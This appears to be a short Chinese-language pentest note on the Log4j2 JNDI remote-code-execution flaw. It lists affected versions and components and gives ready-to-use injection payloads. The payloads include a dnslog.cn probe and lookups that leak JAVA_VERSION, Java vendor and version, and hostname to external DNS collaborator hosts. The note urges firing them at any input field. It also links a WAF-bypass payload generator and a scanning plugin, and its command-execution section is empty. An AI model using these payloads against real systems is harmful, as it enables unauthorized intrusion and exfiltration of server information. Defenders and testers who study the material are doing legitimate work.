# log4j 漏洞

## 漏洞描述

Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，被广泛应用于业务系统开发，用以记录程序输入输出日志信息。是目前较为优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可通过构造指定的恶意请求，触发远程代码执行从而获取服务器权限。

## 影响范围

Apache Log4j 2.x <= 2.15.0-rc1（据悉，官方rc1补丁有被绕过的风险）

受影响组件
Spring-Boot-strater-log4j2
Apache Struts2
Apache Solr
Apache Druid
Apache Flink
ElasticSearch
Flume
Dubbo
Jedis
Logstash
Kafka

## 检测poc

攻击脚本非常简单，有框就X.

${jndi:ldap://****.dnslog.cn} 

![image](https://user-images.githubusercontent.com/75350727/145921324-204a836f-a9fb-4949-b7fb-2f815554d78e.png)


## 远程命令执行



## 信息收集

探测java环境变量进行信息收集。
${jndi:ldap://${env:JAVA_VERSION}.5ou7zt0bj640uqc0bsy1hvyrpiv8jx.burpcollaborator.net}

${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.30ed9b7e.dns.1433.eu.org.}

![image](https://user-images.githubusercontent.com/75350727/145921821-268ce2c7-8b55-42a8-a04d-12d85a77d0e9.png)


## bypass waf

https://github.com/woodpecker-appstore/log4j-payload-generator

## burp插件

https://github.com/whwlsfb/Log4j2Scan
